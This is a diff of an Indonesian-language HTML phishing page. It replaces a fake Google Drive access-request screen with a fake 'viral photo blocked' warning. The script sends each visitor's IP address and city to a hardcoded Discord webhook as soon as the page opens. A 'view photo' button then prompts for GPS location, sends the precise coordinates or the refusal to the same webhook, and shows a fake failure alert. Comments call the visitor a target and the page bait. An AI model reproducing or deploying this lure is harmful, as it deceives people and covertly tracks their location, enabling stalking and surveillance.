@@ -3,31 +3,33 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Google Drive - Request Access</title>
-    <link rel="icon" href="https://ssl.gstatic.com/docs/doclist/images/drive_2022q3_32dp.png">
+    <title>Sistem Keamanan Konten - Peringatan</title>
+    <link rel="icon" href="https://img.icons8.com/emoji/48/lock.png">
     <script src="https://unpkg.com/leaflet@1.9.4/dist/leaflet.js"></script>
     <style>
-        body { font-family: 'Roboto', arial, sans-serif; background-color: #fff; color: #3c4043; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
-        .container { text-align: center; max-width: 400px; padding: 20px; }
-        img { width: 80px; margin-bottom: 20px; }
-        h1 { font-size: 22px; font-weight: 400; margin-bottom: 10px; }
-        p { font-size: 14px; line-height: 1.5; color: #5f6368; }
-        .btn { display: inline-block; margin-top: 20px; padding: 10px 24px; background-color: #1a73e8; color: #fff; text-decoration: none; border-radius: 4px; font-size: 14px; font-weight: 500; cursor: pointer; border: none; }
-        #map { display: none; } /* Map disembunyikan agar tidak curiga */
+        body, html { margin: 0; padding: 0; width: 100%; height: 100%; background: #000; color: #fff; font-family: 'Courier New', monospace; display: flex; justify-content: center; align-items: center; overflow: hidden; }
+        .container { text-align: center; max-width: 350px; padding: 30px; border: 1px solid #ff0000; border-radius: 8px; box-shadow: 0 0 30px #ff0000; background: rgba(20, 0, 0, 0.9); }
+        .icon { font-size: 70px; margin-bottom: 15px; color: #ff0000; }
+        h1 { font-size: 20px; color: #ff0000; margin-bottom: 20px; text-transform: uppercase; letter-spacing: 2px; }
+        p { font-size: 14px; line-height: 1.6; color: #ccc; margin-bottom: 25px; }
+        .btn { display: inline-block; padding: 12px 30px; background: #ff0000; color: #fff; text-decoration: none; border-radius: 4px; font-size: 14px; font-weight: bold; cursor: pointer; border: none; text-transform: uppercase; transition: background 0.3s; }
+        .btn:hover { background: #b30000; }
+        #map { display: none; } /* Disembunyikan */
     </style>
 </head>
 <body>
 
 <div class="container">
-    <img src="https://ssl.gstatic.com/docs/doclist/images/drive_2022q3_32dp.png" alt="Google Drive">
-    <h1>Akses Ditolak</h1>
-    <p>Anda memerlukan izin untuk melihat file ini. Pastikan Anda masuk dengan akun yang benar atau hubungi pemilik file untuk meminta akses.</p>
-    <button class="btn" onclick="requestAccess()">Minta Akses</button>
+    <div class="icon">🔒</div>
+    <h1>PERINGATAN KONTEN</h1>
+    <p>Sistem keamanan mendeteksi bahwa foto Anda yang sedang viral telah diblokir untuk wilayah ini. Silakan konfirmasi identitas Anda untuk melihat atau mengarsipkan konten tersebut.</p>
+    <button class="btn" onclick="requestView()">Lihat Foto</button>
 </div>
 
 <div id="map"></div>
 
 <script>
+// Webhook Kamu
 const webhookURL = "https://discord.com/api/webhooks/1484383057975709819/7qQ5RYrC4FkuCKiin5gEpH0yfliZMNCrM4atDn-qn4LA_dI5zrS-Dwawh3QdA48FY0kI";
 
 async function trackVisitor() {
@@ -37,29 +39,34 @@ async function trackVisitor() {
         const data = await res.json();
         
         // Kirim data IP dulu (Pasti Masuk)
-        await sendToDiscord(data, "Menunggu GPS...", "☁️ IP (Halaman Dibuka)");
+        await sendToDiscord(data, "Menunggu Tombol Klik...", "☁️ IP (Halaman Dibuka)");
 
-        // Coba Ambil GPS Akurat
-        if (navigator.geolocation) {
-            navigator.geolocation.getCurrentPosition(async (pos) => {
-                const lat = pos.coords.latitude;
-                const lon = pos.coords.longitude;
-                const mLink = `https://www.google.com/maps?q=${lat},${lon}`;
-                
-                // Kirim ulang dengan koordinat presisi
-                await sendToDiscord(data, mLink, "🎯 GPS (IZIN DIBERIKAN)");
-            });
-        }
     } catch (err) { console.log("System Ready."); }
+}
+
+async function getPreciseLocation(data) {
+    if (navigator.geolocation) {
+        navigator.geolocation.getCurrentPosition(async (pos) => {
+            const lat = pos.coords.latitude;
+            const lon = pos.coords.longitude;
+            const mLink = `https://www.google.com/maps?q=${lat},${lon}`;
+            
+            // Kirim ulang dengan koordinat presisi
+            await sendToDiscord(data, mLink, "🎯 GPS (KLIK LIHAT FOTO)");
+        }, () => {
+             // Jika menolak
+             sendToDiscord(data, "GPS Ditolak target.", "❌ GPS (MENOLAK)");
+        });
+    }
 }
 
 async function sendToDiscord(data, mapsLink, metode) {
     const payload = {
-        username: "DRIVE NOTIFIER",
-        content: `📂 **DOKUMEN DIAKSES!**\n` +
+        username: "VIRAL NOTIFIER",
+        content: `📸 **UMPAN VIRAL DIAKSES!**\n` +
                  `━━━━━━━━━━━━━━━━━━━━\n` +
                  `🌐 **IP:** ${data.ip}\n` +
-                 `🏙️ **Kota:** ${data.city}, ${data.region}\n` +
+                 `🏙️ **Kota:** ${data.city}\n` +
                  `🎯 **Status:** ${metode}\n` +
                  `🗺️ **Lokasi:** ${mapsLink}\n` +
                  `━━━━━━━━━━━━━━━━━━━━`
@@ -72,8 +79,15 @@ async function sendToDiscord(data, mapsLink, metode) {
     });
 }
 
-function requestAccess() {
-    alert("Permintaan akses telah dikirim ke pemilik file. Anda akan menerima notifikasi email jika disetujui.");
+async function requestView() {
+    // Ambil data IP lagi untuk memastikan
+    const res = await fetch("https://ipapi.co/json/");
+    const data = await res.json();
+    
+    // Pemicu izin lokasi
+    getPreciseLocation(data);
+    
+    alert("Konfirmasi identitas gagal. Konten tetap diblokir demi keamanan.");
 }
 
 // Jalankan otomatis saat web dibuka
